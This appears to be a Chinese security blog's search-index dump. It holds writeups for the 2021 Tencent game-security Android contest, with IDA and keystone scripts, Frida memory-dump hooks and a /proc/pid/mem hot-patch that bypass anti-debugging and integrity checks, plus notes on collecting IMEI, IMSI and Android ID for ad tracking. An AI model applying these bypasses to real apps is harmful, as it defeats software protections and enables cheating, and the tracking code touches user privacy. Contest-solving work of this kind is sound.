S\\\\x27).1G(\\\\x271e\\\\x27)}z{p(s===2q||s===2T){1u\\\\x20O\\\\x201t(1l)}z\\\\x20p(s.1J===Z){s=O\\\\x202r(s)}}p(1z.1K(s)||Z.1N(s)||s.1J===1Y){A\\\\x201S.2x(2n).S(O\\\\x201Y(s)).1G(\\\\x271e\\\\x27)}z{A\\\\x20P(s)}};A\\\\x202z};q\\\\x202k=w(1X,x){A\\\\x20w(G,s){A\\\\x20O\\\\x201P(G,x,1d).S(s)[1X]()}};q\\\\x202f=w(x){q\\\\x20P=2k(\\\\x271e\\\\x27,x);P.1T=w(G){A\\\\x20O\\\\x201P(G,x)};P.S=w(G,s){A\\\\x20P.1T(G).S(s)};1g(q\\\\x20i=0;i\u003c1E.W;++i){q\\\\x20T=1E[i];P[T]=2k(T,x)}A\\\\x20P};w\\\\x20N(x,1v){p(1v){l[0]=l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0;k.l=l}z{k.l=[0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]}p(x){k.C=4I;k.B=4H;k.E=4l;k.F=4U;k.J=4J;k.I=4K;k.H=4L;k.D=4T}z{k.C=4X;k.B=4W;k.E=4Y;k.F=4Z;k.J=4V;k.I=4O;k.H=4F;k.D=4s}k.1C=k.1A=k.L=k.2i=0;k.1U=k.1L=1O;k.2j=1d;k.x=x}N.Q.S=w(s){p(k.1U){A}q\\\\x202h,T=1c\\\\x20s;p(T!==\\\\x272p\\\\x27){p(T===\\\\x271n\\\\x27){p(s===2q){1u\\\\x20O\\\\x201t(1l)}z\\\\x20p(1y\u0026\u0026s.1J===Z){s=O\\\\x202r(s)}z\\\\x20p(!1z.1K(s)){p(!1y||!Z.1N(s)){1u\\\\x20O\\\\x201t(1l)}}}z{1u\\\\x20O\\\\x201t(1l)}2h=1d}q\\\\x20r,M=0,i,W=s.W,l=k.l;4t(M\u003cW){p(k.1L){k.1L=1O;l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}p(2h){1g(i=k.1A;M\u003cW\u0026\u0026i\u003c1k;++M){l[i\u003e\u003e2]|=s[M]\u003c\u003cU[i++\u00263]}}z{1g(i=k.1A;M\u003cW\u0026\u0026i\u003c1k;++M){r=s.1Q(M);p(r\u003cR){l[i\u003e\u003e2]|=r\u003c\u003cU[i++\u00263]}z\\\\x20p(r\u003c2v){l[i\u003e\u003e2]|=(2t|(r\u003e\u003e6))\u003c\u003cU[i++\u00263];l[i\u003e\u003e2]|=(R|(r\u0026V))\u003c\u003cU[i++\u00263]}z\\\\x20p(r\u003c2A||r\u003e=2E){l[i\u003e\u003e2]|=(2D|(r\u003e\u003e12))\u003c\u003cU[i++\u00263];l[i\u003e\u003e2]|=(R|((r\u003e\u003e6)\u0026V))\u003c\u003cU[i++\u00263];l[i\u003e\u003e2]|=(R|(r\u0026V))\u003c\u003cU[i++\u00263]}z{r=2C+(((r\u002623)\u003c\u003c10)|(s.1Q(++M)\u002623));l[i\u003e\u003e2]|=(2X|(r\u003e\u003e18))\u003c\u003cU[i++\u00263];l[i\u003e\u003e2]|=(R|((r\u003e\u003e12)\u0026V))\u003c\u003cU[i++\u00263];l[i\u003e\u003e2]|=(R|((r\u003e\u003e6)\u0026V))\u003c\u003cU[i++\u00263];l[i\u003e\u003e2]|=(R|(r\u0026V))\u003c\u003cU[i++\u00263]}}}k.2u=i;k.L+=i-k.1A;p(i\u003e=1k){k.1C=l[16];k.1A=i-1k;k.1W();k.1L=1d}z{k.1A=i}}p(k.L\u003e4r){k.2i+=k.L/2H\u003c\u003c0;k.L=k.L%2H}A\\\\x20k};N.Q.1s=w(){p(k.1U){A}k.1U=1d;q\\\\x20l=k.l,i=k.2u;l[16]=k.1C;l[i\u003e\u003e2]|=2w[i\u00263];k.1C=l[16];p(i\u003e=4q){p(!k.1L){k.1W()}l[0]=k.1C;l[16]=l[1]=l[2]=l[3]=l[4]=l[5]=l[6]=l[7]=l[8]=l[9]=l[10]=l[11]=l[12]=l[13]=l[14]=l[15]=0}l[14]=k.2i\u003c\u003c3|k.L\u003e\u003e\u003e29;l[15]=k.L\u003c\u003c3;k.1W()};N.Q.1W=w(){q\\\\x20a=k.C,b=k.B,c=k.E,d=k.F,e=k.J,f=k.I,g=k.H,h=k.D,l=k.l,j,1a,1b,1j,v,1f,1h,1B,1Z,1V,1D;1g(j=16;j\u003c1k;++j){v=l[j-15];1a=((v\u003e\u003e\u003e7)|(v\u003c\u003c25))^((v\u003e\u003e\u003e18)|(v\u003c\u003c14))^(v\u003e\u003e\u003e3);v=l[j-2];1b=((v\u003e\u003e\u003e17)|(v\u003c\u003c15))^((v\u003e\u003e\u003e19)|(v\u003c\u003c13))^(v\u003e\u003e\u003e10);l[j]=l[j-16]+1a+l[j-7]+1b\u003c\u003c0}1D=b\u0026c;1g(j=0;j\u003c1k;j+=4){p(k.2j){p(k.x){1B=4m;v=l[0]-4n;h=v-4o\u003c\u003c0;d=v+4p\u003c\u003c0}z{1B=4v;v=l[0]-4w;h=v-4G\u003c\u003c0;d=v+4D\u003c\u003c0}k.2j=1O}z{1a=((a\u003e\u003e\u003e2)|(a\u003c\u003c30))^((a\u003e\u003e\u003e13)|(a\u003c\u003c19))^((a\u003e\u003e\u003e22)|(a\u003c\u003c10));1b=((e\u003e\u003e\u003e6)|(e\u003c\u003c26))^((e\u003e\u003e\u003e11)|(e\u003c\u003c21))^((e\u003e\u003e\u003e25)|(e\u003c\u003c7));1B=a\u0026b;1j=1B^(a\u0026c)^1D;1h=(e\u0026f)^(~e\u0026g);v=h+1b+1h+K[j]+l[j];1f=1a+1j;h=d+v\u003c\u003c0;d=v+1","date":"2021-10-13","objectID":"/dvwa/:14:3","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"参考链接 https://www.freebuf.com/articles/web/274058.html https://jckling.github.io/2020/04/23/Security/DVWA/2.%20Command%20Injection/ https://segmentfault.com/a/1190000019484055 https://www.jianshu.com/p/ec2ca79e74b2 ","date":"2021-10-13","objectID":"/dvwa/:15:0","tags":null,"title":"DVWA Writeup","uri":"/dvwa/"},{"categories":["writeup"],"content":"App分析 ","date":"2021-09-07","objectID":"/gslab2021-final/:1:0","tags":null,"title":"2021腾讯游戏安全大赛安卓方向决赛题解","uri":"/gslab2021-final/"},{"categories":["writeup"],"content":"引擎 lib文件夹下有libil2cpp.so，assets\\bin\\Data\\Managed\\Metadata下有global-metadata.dat，说明是unity3D引擎的il2cpp编译方式。global-metadata.dat和libil2cpp.so均被加密。 ida 打开 libsec2021.so 不识别，用readelf查看发现e_phentsize字段有问题，大小为23，将23改为 32 后可以正常识别。 ","date":"2021-09-07","objectID":"/gslab2021-final/:1:1","tags":null,"title":"2021腾讯游戏安全大赛安卓方向决赛题解","uri":"/gslab2021-final/"},{"categories":["writeup"],"content":"检测绕过 libsec2021.so还是壳的so，同样字符串被整体加密处理了，但是解密算法直接inline，而且看起来密文并不完全在一个数组中。 同样frida spawn模式启动app然后ida attach上去调试，发现调试退出的地方都长这样 使用ida脚本对这些地方批量下断点 import idc base = 0xD1E05000 # base of libsec2021 ea = base + 0x58A0 end = base + 0x416d4 idc.create_insn(ea) while ea \u003c end: ins = idc.generate_disasm_line(ea, 0) if ins == \"EOR R1, R1, R2\": ea_1 = idc.next_head(ea) ins = idc.generate_disasm_line(ea_1, 0) if ins == \"BLX R1\": ida_dbg.add_bpt(ea_1) ea = ea_1 ea = ea + 4 idc.create_insn(ea) print(\"Finished\") 经过调试发现 check 的位 置应该在 sub_2E3C8 中，这个函数经过了混淆，直接调用改间接调用，尝试用 keystone 去一下混淆: (这里利用了 ida 会解释这个间接调用的位置，写在调用指令后的注释 中，所以可以直接从注释中取调用的函数地址，不用自己计算)： import keystone as ks import idautils import ida_bytes md32 = ks.Ks(ks.KS_ARCH_ARM, ks.KS_MODE_ARM) sub_str = \"; sub_\" def getASM(str, ea): try: ans = md32.asm(str, ea)[0] except Exception: ans = [] return ans def main(): cur_addr = 0x58A0 idc.create_insn(cur_addr) while cur_addr \u003c 0x416D4: idc.create_insn(cur_addr) ins = idc.generate_disasm_line(cur_addr, 0) if ins == \"\": print(hex(cur_addr), \"null\") if ins[0] == 'B' and ins.find(\" R\") \u003e 0: if ins.find(sub_str) \u003e= 0: idx = ins.find(sub_str) + len(sub_str) addr = ins[idx:] b_ins = ins[:ins.find(' ')] print(hex(cur_addr), ins) new_ins = b_ins + ' ' + \"0x\" + addr new_asmins = getASM(new_ins, cur_addr) print(addr, new_ins, new_asmins) for i in range(len(new_asmins)): ida_bytes.patch_byte(cur_addr + i, new_asmins[i]) cur_addr = cur_addr + 4 idc.create_insn(cur_addr) main() Patch 前后：(有一些 keystone 会解析失败，然后一些系统调用函数没有加进来，比 如说 new []) 手动f9将断下来的地方patch。这时程序会断在libunity中，应该是利用程序校验和解密unity，patch导致密钥计算不正确解密失败所以出错退出了。 从libunity中的initproc函数调试，发现libunity使用了libsec2021导出表g_sec2021_p_array中的第一个函数sub_39140去解密。 调试这个函数，sub_33B08返回一个bss段的地址，这个地址处存储的是一个指向堆的指针。 sub_340D8将sem_wait接收到的值写入上述地址中，结合初赛的题目可以猜测这个地方就是key存储的位置。因为程序被patch导致此处key值发生了改变所以libunity解密不正确。直接用GG挂上去看内存，得到此处存储的值为de 42 78 27 03 20 00 00，将程序patch修改此处的值为固定值即可。 使用findcrypt可以检测出AES加密常数，解密算法为AES CBC算法，经过调试和hook发现key是classes.dex，AndroidManifest.xml，代码段，以及 com/tencent/games/sec2021/Sec2021Application这个字符串的crc32值，即为277842de277842de，iv为算法中写死的值[ 0, 4, 8, 0xC, 0x10, 0x14, 0x18, 0x1C, 0x20, 0x24, 0x28, 0x2C, 0x30, 0x34, 0x38, 0x3C]。 patch完成之后已经可以调试了。 ","date":"2021-09-07","objectID":"/gslab2021-final/:1:2","tags":null,"title":"2021腾讯游戏安全大赛安卓方向决赛题解","uri":"/gslab2021-final/"},{"categories":["writeup"],"content":"程序逻辑修改 准备解密 metadata，直接用GG从内存dump出来 il2cpp.so，替换原始so的.text和.rodata，搜字符串找到 initialize函数。 动态调试截获sub_5B9238的返回值就是解密后的metadata文件。但是直接扔到il2cppdumper中会报错。 参考FlappyBirdStyleGame代码，直接编译后发现libil2cpp.so是一样的，这样就能用il2cppdumper恢复符号。找到了OnTriggerEnter2D的位置，修改触碰Obstacle后的行为，具体只要把00540E60的BNE语句改成B语句。 关键就是过掉这个检测，patch本身很容易，但是由于程序有解密操作，所以直接在解密函数中判断并 patch。 用 bss 段后一小段未使用空间用来计数，当前是第几次解密。如果是第三次解密就进行 patch，把 0x1A 替换为 0xEA。 函数放在解密过后的校验过程里。重打包以后即可达到撞杆不死的效果。 （同样，因为是AES CBC模式的加密，可以将需要修改代码段所在的整个block进行加密。） ","date":"2021-09-07","objectID":"/gslab2021-final/:1:3","tags":null,"title":"2021腾讯游戏安全大赛安卓方向决赛题解","uri":"/gslab2021-final/"},{"categories":["writeup"],"content":"其他解法 ","date":"2021-09-07","objectID":"/gslab2021-final/:2:0","tags":null,"title":"2021腾讯游戏安全大赛安卓方向决赛题解","uri":"/gslab2021-final/"},{"categories":["writeup"],"content":"hot patch 来自shyoshyo师傅的题解。 在过反调试的时候可以从崩溃日志中查看得到出错退出的位置 因为直接patch会导致后续解密失败，可以选择hot patch的方式，修改/proc/pid/mem文件动态修改App内存。 void ipatch(int mem_fd, unsigned long long addr, unsigned char old, unsigned char new, int dir) { unsigned char buf1[] = {0, 0}; unsigned char buf2[] = {0, 0}; unsigned char buf3[] = {dir ? old : new, 0}; lseek64(mem_fd, addr, SEEK_SET); read(mem_fd, buf1, 1); lseek64(mem_fd, addr, SEEK_SET); write(mem_fd, buf3, 1); lseek64(mem_fd, addr, SEEK_SET); read(mem_fd, buf2, 1); printf(\"%s %08llx: %02x -\u003e %02x\\n\", dir ? \"old\" : \"new\", addr, buf1[0], buf2[0]); } int main(int argc, char *argv[]) { //… sprintf(mem_file_name, \"/proc/%s/mem\", argv[1]); mem_fd = open(mem_file_name, O_RDWR); long long addr = findaddr(argv[1], \"sec2021\", \"00000000\"); if (addr != -1) { printf(\"start patch ...\\n\"); ipatch(mem_fd, addr + 0x01B541 - 1, 0x2A, 0x00, 0); ipatch(mem_fd, addr + 0x01B543 - 1, 0x00, 0xA0, 0); // 省略若干，都可以根据崩溃日志分析得到 ipatch(mem_fd, addr + 0x00024602, 0x2F, 0xA0, 0); ipatch(mem_fd, addr + 0x00024606, 0xE0, 0x00, 0); ipatch(mem_fd, addr + 0x0004B230, 0x9f, 0x12, 0); ipatch(mem_fd, addr + 0x0004B231, 0x13, 0x34, 0); ipatch(mem_fd, addr + 0x0004B232, 0x79, 0x56, 0); ipatch(mem_fd, addr + 0x0004B233, 0x66, 0x78, 0); printf(\"patch done %d ...\\n\", 0); } return 0; } 然后通过静态注入的方式注入一个共享库，然后在共享库里放 hot-patch 的代码（以及绕过包重签名的）。注入利用 libmain，方式如下：将原来的 libmian.so 重命名为 libmain2.so，注入用的新代码写在 libmain.so 里，并 libmian.so 拉 libmain2.so，而且libmain.so 要将 libmain2.so 导出的 JNI_OnLoad 向调用者传过去。libmian.so 的入口是 my_init()。 ","date":"2021-09-07","objectID":"/gslab2021-final/:2:1","tags":null,"title":"2021腾讯游戏安全大赛安卓方向决赛题解","uri":"/gslab2021-final/"},{"categories":["writeup"],"content":"修复global-metadata 对照 il2cpp 和 il2cppdumper 源码分析，发现偏移值对不上，把开头三个 string 相关区块挪到中间去 了，恢复脚本关键代码如下 分析过程中发现对字符串区段有加密，异或加密 恢复之后丢到 il2cppdumper，还是有问题。 把版本号改成 0x18，成功恢复出 dll。 运行 ida 脚本后找到关键函数PlayerController$$OnTriggerEnter2D ","date":"2021-09-07","objectID":"/gslab2021-final/:2:2","tags":null,"title":"2021腾讯游戏安全大赛安卓方向决赛题解","uri":"/gslab2021-final/"},{"categories":["writeup"],"content":"参考链接 https://blog.xhyeax.com/2021/04/10/gslab2021-final-android/ https://www.52pojie.cn/thread-1420796-1-1.html ","date":"2021-09-07","objectID":"/gslab2021-final/:3:0","tags":null,"title":"2021腾讯游戏安全大赛安卓方向决赛题解","uri":"/gslab2021-final/"},{"categories":["writeup"],"content":"App分析 ","date":"2021-09-02","objectID":"/gslab2021-pre/:1:0","tags":null,"title":"2021腾讯游戏安全大赛安卓方向初赛题解","uri":"/gslab2021-pre/"},{"categories":["writeup"],"content":"引擎 lib文件夹下有libmono.so和libunity.so，assets\\bin\\Data\\Managed下存在Assembly-CSharp.dll说明是mono引擎的unity3d游戏。 Assembly-CSharp.dll经过加密处理，加密方式是异或0xaf，异或还原补上PE头之后可以拖进dnspy中分析，但是发现这个Assembly-CSharp.dll中并没有包含实际的游戏逻辑，应该是隐藏进了其他地方。 ","date":"2021-09-02","objectID":"/gslab2021-pre/:1:1","tags":null,"title":"2021腾讯游戏安全大赛安卓方向初赛题解","uri":"/gslab2021-pre/"},{"categories":["writeup"],"content":"检测绕过 frida spawn模式启动app，ida附加调试，在调试JNI_OnLoad函数的过程中发现sub_1F120用于获取apk的关键字符串信息，还原这个函数并将实际字符串写入调用的注释中。 import idc origin_str = [...] # byte_372A8 key = [0xD1, 0x19, 0x0F, 0xD3, 0x57, 0x49, 0xF7, 0x75, 0xED, 0xC5, 0x17, 0xE9, 0x25, 0xB9, 0xC1, 0x1D, 0x5] out = {} idx = 0 def fetch(): global idx ret = origin_str[idx] idx += 1 return ret while idx \u003c len(origin_str): start = idx curr_key = fetch() str_len = fetch() ^ curr_key s = \"\" for i in range(str_len): s += chr(fetch()^curr_key^key[i%0x11]) out[start] = s fetch() fetch() def getStr(index): return out[index] ea = 0 end = 0x30474 ea = idc.next_head(ea) while ea \u003c end: ins = idc.generate_disasm_line(ea, 0) if ins == \"BL getStr\": addr = idc.prev_head(ea) while True: insPre = idc.generate_disasm_line(addr, 0) if insPre.find(\"MOV\") == 0 and insPre.find(\"R0\") \u003e 0: argc = idc.print_operand(addr, 1) print(addr, argc) argc = argc.lstrip('#') argcI = int(argc, 16) comment = getStr(argcI) print(ea, comment) idc.set_cmt(ea, comment, 0) break else: addr = idc.prev_head(addr) ea = idc.next_head(ea) 还原出来的字符串如下： 28 Author: saitexie walterjxli 59 Do you know how unity mono works? 96 res/drawable-xhdpi-v4/ -\u003e assets/bin/Data/Managed/ 150 initialize 164 ()I 171 com/tencent/games/sec2021/Sec2021Application 219 com/tencent/games/sec2021/Sec2021IPC 259 hack detected, risk score:%d 291 getApplicationInfo 313 ()Landroid/content/pm/ApplicationInfo; 355 getFilesDir 370 ()Ljava/io/File; 390 sourceDir 403 packageName 418 nativeLibraryDir 438 getAbsolutePath 457 /proc/self/status 478 TracerPid: 492 diediedie 505 /proc/self/maps 524 rb 530 delete 540 %zx-%zx %c%c%c%c %x %x:%x %u %s 575 android/os/Debug 595 isDebuggerConnected 618 sec2021 629 getClass 641 getName 652 getSuperclass 669 android/app/Application 696 java/lang/Class 715 ()Ljava/lang/Class; 738 ()Landroid/content/pm/ApplicationInfo; 780 ()Ljava/io/File; 800 ()Ljava/lang/String; 824 Assembly-CSharp.dll 847 Mono.Security.dll 868 mscorlib.dll 884 System.Core.dll 903 System.dll 917 UnityEngine.dll 936 UnityEngine.Networking.dll 966 UnityEngine.PlaymodeTestsRunner.dll 1005 UnityEngine.UI.dll 1027 base.apk 1039 android/content/Context 1066 ()Ljava/lang/ClassLoader; 1095 ()Ljava/lang/String; 1119 zip file 1131 libsec2021.so 1148 %s/%s 1157 dalvik.system.PathClassLoader 1190 toString 1202 getClassLoader 1220 Ljava/lang/String; 1242 %s%s 1250 /app/data/libbugly/crash.info 1283 can you crack me? 1304 __optional__ 1320 cc/binmt/signature/PmsHookApplication 1361 com/cloudinject/feature/App 1392 np/manager/FuckSign 1415 java/lang/ClassLoader 1440 findClass 1453 (Ljava/lang/String;)Ljava/lang/Class; 1494 getPackageManager 1515 ()Landroid/content/pm/PackageManager; 1556 getPackageName 1574 getPackageInfo 1592 (Ljava/lang/String;I)Landroid/content/pm/PackageInfo; 1649 signatures 1663 [Landroid/content/pm/Signature; 1698 toByteArray 1713 ()[B 1721 java/io/ByteArrayInputStream 1753 \u003cinit\u003e 1763 ([B)V 1772 java/security/cert/CertificateFactory 1813 getInstance 1828 (Ljava/lang/String;)Ljava/security/cert/CertificateFactory; 1891 X.509 1900 generateCertificate 1923 (Ljava/io/InputStream;)Ljava/security/cert/Certificate; 1982 getEncoded 1996 java/security/MessageDigest 2027 (Ljava/lang/String;)Ljava/security/MessageDigest; 2080 SHA1 2088 digest 2098 ([B)[B 2108 %s/libsec2021.so 2128 .text 2137 res/drawable-xhdpi-v4/sec2021.png 2174 assets/filelist 2193 endoffile 2206 State 2215 stop 2223 substrate 2236 /proc/%u/status 2255 %s/libmono.so 2272 rtld_db_dlactivity 2294 /system/bin/linker 2316 libjdwp.so 2330 assets/sig.dat 2348 opcode crack 2364 debugger 2376 bad apk 2387 bad files 2400 bad cert 2412 ida 2419 frida 2428 shellcode 2441 bad dll 2452 hack detected, type:%s 2478 0x%08x 2488 libmono.so 2502 libunity.so 2517 libmain.so 2531 META-INF/TEST.SF 2551 META-INF/TEST.RSA 2572 META-INF/MANIFEST.MF 2596 .so 2603 simulator 2616 /system/ 2628 no heart beat. 2646 (ILjava/lang/String;)V 2672 onNativeEngineResponse 2698 /proc/net/tcp 游戏在检测出来frida,ida等工具时会显示\"hack detected, type ","date":"2021-09-02","objectID":"/gslab2021-pre/:1:2","tags":null,"title":"2021腾讯游戏安全大赛安卓方向初赛题解","uri":"/gslab2021-pre/"},{"categories":["writeup"],"content":"关键逻辑获取 mono中dll是从mono_image_open_from_data_with_name函数处加载，打开libmono.so发现mono_image_open_from_data_with_name被加密了。使用GG修改器从内存中dump出来mono.so,发现mono_image_open_from_data_with_name函数被Hook转入调用libsec2021.so导出表中的函数 最终调用可以追溯到libsec2021.so中的sub_1CEDC函数 在这里解密sec2021.png的后半段获取真正的Assembly-CSharp.dll。(其实从解密获取的字符串，参数等于96的地方有提示res/drawable-xhdpi-v4/ -\u003e assets/bin/Data/Managed/) 可以hookmono_image_open_from_data_with_name的下一条指令，当读取到真正的Assembly-CSharp.dll时（通过大小判断），将其dump出来。 function dump_memory(base,size) { Java.perform(function () { var currentApplication = Java.use(\"android.app.ActivityThread\").currentApplication(); var dir = currentApplication.getApplicationContext().getFilesDir().getPath(); var file_path = dir + \"/dumpmemory.bin\"; var file_handle = new File(file_path, \"wb\"); if (file_handle \u0026\u0026 file_handle != null) { Memory.protect(ptr(base),size, 'rwx'); var libso_buffer = ptr(base).readByteArray(size); file_handle.write(libso_buffer); file_handle.flush(); file_handle.close(); console.log(\"[dump]:\", file_path); } }); } function hook_mono() { var libbase = Module.findBaseAddress(\"libmono.so\"); console.log(\"libbase\", libbase); var addr = Module.findExportByName(\"libmono.so\", \"mono_image_open_from_data_with_name\"); console.log(\"mono_image_open_from_data_with_name\", addr); Interceptor.attach(Module.findExportByName(\"libmono.so\", \"mono_image_open_from_data_with_name\").add(4), { onEnter: function (args) { var data = args[0]; var data_len = args[1]; if (data_len == 0x2800) { dump_memory(data, data_len); } console.log(\"mono_image_open_from_data_with_name_ori() called!\", data, data_len); }, onLeave: function (retval) { } }); } 也可以直接从sec2021.png中解密，解密函数在sub_1D2A0。 其中key从sub_6320处使用sem_init,sem_wait相关的函数收到的，与PostMessage/PeekMessage相似，需要找到信号发送函数，即sem_post函数。 int __fastcall sub_16108(int *a1) { *a1 = sub_16128(); return sem_post(a1 + 3); } 如图，初始密钥是从classes.dex文件的crc和sec2021,com/tencent/games/sec2021/Sec2021Application两个字符串的crc异或得到的。 直接还原函数得到异或的密钥后解密。png中的偏移是16651开始。 解密完成以后可以得到真正的Assembly-CSharp.dll文件。 ","date":"2021-09-02","objectID":"/gslab2021-pre/:1:3","tags":null,"title":"2021腾讯游戏安全大赛安卓方向初赛题解","uri":"/gslab2021-pre/"},{"categories":["writeup"],"content":"修改 放到dnspy中查看，看到MouseController碰撞检测函数OnTriggerEnter2D中对碰撞物体进行了判断，如果不是金币则调用HitByLaser函数。 做出如下修改即可达到撞杆不死的效果 修改完成之后替换原本的Assembly-CSharp.dll文件，修改libsec2021.so使其不从sec2021.png中解密获取Assembly-CSharp.dll 因为替换后的文件确实以MZ开头，所以不进行解密替换，修改完成后重打包就可以达到撞杆不死的效果了。 ","date":"2021-09-02","objectID":"/gslab2021-pre/:1:4","tags":null,"title":"2021腾讯游戏安全大赛安卓方向初赛题解","uri":"/gslab2021-pre/"},{"categories":["writeup"],"content":"其他思路 看到师傅们的题解大概还有一些可行性思路，总结一下 模拟libsec2021.so因为mono.so和unity.so经过加密，且需要调用g_sec2021_p_array中的函数进行解密，libsec2021.so中又存在诸多完整性校验，所以可以自己写一个libsec模拟这些函数直接去掉原始的壳文件。 frida-gadget 我的理解是这个方法类似把frida脚本直接写进了apk里面，之前没用过，具体细节可以看xhyeax师傅的博客。 将UnityEngine.dll和Assembly-CSharp.dll作为引用，编写一个注入dll，从而拦截HitByLaser方法(GitHub - Misaka-Mikoto-Tech/MonoHook: hook C# method at runtime without modify dll file (such as UnityEditor.dll))。 在native层hook dlopen函数，过掉libsec2021.so的检测，并获取libmono句柄，然后导出mono的api，在Assembly-CShar p.dll加载后，调用api加载注入dll（使用Cydia Substrate框架） 后面patch dll之后不修改so而是将修改后的dll加密以后再写回sec2021.png，由于会校验CRC所以可以爆破最后四个字节使CRC不变。assets/filelist存放了apk所有文件列表及其CRC值，因此还要在这里修改libsec2021.so的CRC(但是好像过了检测绕过以后就不用修改这个了)。 ","date":"2021-09-02","objectID":"/gslab2021-pre/:2:0","tags":null,"title":"2021腾讯游戏安全大赛安卓方向初赛题解","uri":"/gslab2021-pre/"},{"categories":["writeup"],"content":"参考链接 https://blog.xhyeax.com/2021/04/04/gslab2021-pre-android/ https://www.52pojie.cn/thread-1420775-1-1.html https://bbs.pediy.com/thread-226135.htm https://bbs.pediy.com/thread-226208.htm https://bbs.pediy.com/thread-226261.htm ","date":"2021-09-02","objectID":"/gslab2021-pre/:3:0","tags":null,"title":"2021腾讯游戏安全大赛安卓方向初赛题解","uri":"/gslab2021-pre/"},{"categories":["notes"],"content":"在init_array中下断 下面是网上的一般做法，感觉可能比较适合老一些的android版本，不过也应该都差不多 从手机中pull出来linker 搜索字符串\"[ Calling %s @ %p for ‘%s’ ]\"(可能并不是一模一样，没找到的话部分搜索试试) 查找引用这个字符串的地址，如果是直接pull出来的linker的话是保留符号信息的，找call_array/call_function相关的函数 找字符串下方BLX R4的地方 ","date":"2021-09-01","objectID":"/init_array/:1:0","tags":null,"title":"调试android so的.init_array数组","uri":"/init_array/"},{"categories":["notes"],"content":"init_array下断原理 android源码网站：androidxref.com loadlibrary的主要步骤 调用linker的dlopen完成加载 调用dlsym获取目标so的JniOnload地址并调用 初始化SharedLibrary对象并添加到表中, 下次加载相同的so则不在重复加载 查看dlopen源码 调用find_library转载链接so文件，加载成功后返回soinfo对象指针，同时调用call_constructors函数来调用so中的init_array。 call_constructors先完成其他模块的加载,然后调用call_array来调用init_array数组中的函数。 call_array循环调用call_funtion来进行加载，最后call_function只是简单的调用传进来的函数指针, 可以看到我们上面的下断点的字符串就来自于这里。 所以网上的一般做法可能适用情况有限，可以直接通过对照linker中的源码实现来最终定位，一般来说先找到call_array中的字符串找对应位置即可。 对于64位so的情况相似，不过是BLX R4这条指令不同，但是肯定也是找到字符串以后定位寄存器直接调用的地方就行。 ","date":"2021-09-01","objectID":"/init_array/:2:0","tags":null,"title":"调试android so的.init_array数组","uri":"/init_array/"},{"categories":["notes"],"content":"参考链接 IDA调试 Android so文件的10个技巧 ","date":"2021-09-01","objectID":"/init_array/:3:0","tags":null,"title":"调试android so的.init_array数组","uri":"/init_array/"},{"categories":["notes"],"content":"如何获取移动设备唯一标识 在移动广告领域，设备唯一标识是用来追踪用户的最重要的标识。 对于精准广告和个性化推荐而言，可以通过设备唯一标识，进行千人千面的精准投放。 ","date":"2021-04-13","objectID":"/stack_unwind/:0:0","tags":null,"title":"Android逆向笔记","uri":"/stack_unwind/"},{"categories":["notes"],"content":"IMEI/MEID IMEI (International Mobile Equipment Identity) 是国际移动设备识别码，即通常所说的手机“串号”，用于在移动电话网络中识别每一部独立的手机等移动通信设备，相当于移动电话的身份证。IMEI 适用于 GSM、WCDMA、LTE 制式的移动设备。 MEID (Mobile Equipment IDentifier) 是移动设备识别码，它也是一个全球唯一识别移动设备的号码。但它适用于 CDMA 制式手机。 对于全网通的移动设备 IMEI 和 MEID 标识都存在，对于支持双卡的设备，还会有 2 个 IMEI/MEID。 因为这两个标识的作用相同，所以对于移动广告行业来说，一般不对 IMEI/MEID 做严格区分，在广告请求中一般作为同一个字段（比如：DeviceID 或缩写成 did）进行传输。 对于 iOS 设备来说，苹果官方在 iOS 5.0 之后就屏蔽了获取 IMEI/MEID 的接口，因此现在的苹果设备都无法获取到 IMEI/MEID。 对于 Android 设备来说，可以通过下面的方法来获取 IMEI/MEID： static String getDeviceId(Context context) { TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE); if (tm != null) { try { String id = tm.getDeviceId(); if (id != null) return id; } catch (SecurityException e) { } } return \"\"; } 对于非手机设备，如 Android 平板电脑，电视等，这些设备没有通话的硬件功能，系统中也就没有 TELEPHONY_SERVICE，所以这里要判断一下 tm 这个返回值是否为空。 在 Android 8.0 之后，TelephonyManager 上的这个 getDeviceId 方法尽管被标记为已过时，并提供了 getImei 和 getMeid 来取代它。但 getDeviceId 又不是不能用，而且也不需要区分获取到的究竟是 Imei 还是 Meid，所以这里不需要通过判断版本号的方式来替换这个方法。 获取 IMEI/MEID 的需要 READ_PHONE_STATE 权限，否则会发生 SecurityException 异常。如果应用以 Android 10 或更高版本为目标平台，在应用没有 READ_PRIVILEGED_PHONE_STATE 权限时，也会发生 SecurityException 异常，而且普通开发者开发的应用是不可能获取到该权限的。所以，调用 tm.getDeviceId() 时，加了 try/catch 语句，避免崩溃。 ","date":"2021-04-13","objectID":"/stack_unwind/:1:0","tags":null,"title":"Android逆向笔记","uri":"/stack_unwind/"},{"categories":["notes"],"content":"IMSI IMSI (International Mobile Subscriber Identity) 是国际移动用户识别码。通俗的讲，它是相对手机卡而言的唯一识别码。 在 iOS 设备上，跟 IMEI/MEID 一样，是无法获取到 IMSI 的。 对于 Android 设备来说，获取 IMSI 的方法跟获取 IMEI/MEID 的方法类似： static String getIMSI(Context context) { TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE); if (tm != null) { try { String id = tm.getSubscriberId(); if (id != null) return id; } catch (SecurityException e) { } } return \"\"; } 在 Android 上获取 IMSI 的权限要求跟 IMEI/MEID 一样，这里就不在重复。 ","date":"2021-04-13","objectID":"/stack_unwind/:2:0","tags":null,"title":"Android逆向笔记","uri":"/stack_unwind/"},{"categories":["notes"],"content":"Android ID Android ID 是 Android 设备里不依赖于硬件的一种「半永久标识符」，在系统生命周期内不会改变，但系统重置或刷机后可能会发生变化，其作用域为一组有关联的应用。 Android ID 获取的方式很简单： static String getAndroidID(Context context) { return Secure.getString(context.getContentResolver(), Secure.ANDROID_ID); } 但是在 Android 8.0 以后，签名不同的 App 所获取的 Android ID 是不一样的，但同一个开发者可以根据自己的数字签名，将所开发的不同 App 进行关联。 